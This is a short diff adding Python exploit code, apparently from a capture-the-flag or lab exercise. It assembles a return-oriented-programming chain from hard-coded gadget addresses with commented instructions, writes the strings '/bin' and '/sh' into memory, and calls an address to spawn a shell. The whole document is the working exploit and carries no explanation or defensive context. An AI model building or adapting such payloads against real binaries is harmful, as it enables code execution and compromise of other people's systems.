@@ -1,0 +1,17 @@
+payload = p64(0x41c7c6)
+#0x41c7c6: pop rsi ; retf
+payload += p64(0x481055)+p32(0x40c31a)+p32(0x33)
+# 0x000000000040c31a: pop rdx; mov ecx, 0x8948ffff; ret; 
+payload += p64(0x6e69622f)+p64(0x46326f)
+# 0x000000000046326f: add dword ptr [rsi + 3], edx; ret; 
+payload += p64(0x41c7c6)
+# 0x41c7c6: pop rsi ; retf
+payload += p64(0x481059)+p32(0x40c31a)+p32(0x33)
+# 0x000000000040c31a: pop rdx; mov ecx, 0x8948ffff; ret; 
+payload += p64(0x68732f)+p64(0x46326f)
+# 0x000000000046326f: add dword ptr [rsi + 3], edx; ret; 
+payload += p64(0x431385)
+# 0x0000000000431385: pop rdi; ret; 
+payload += p64(0x481058)+p64(0x4011c6)
+# call address 0x4011c6
+payload += p64(0x4011c6)
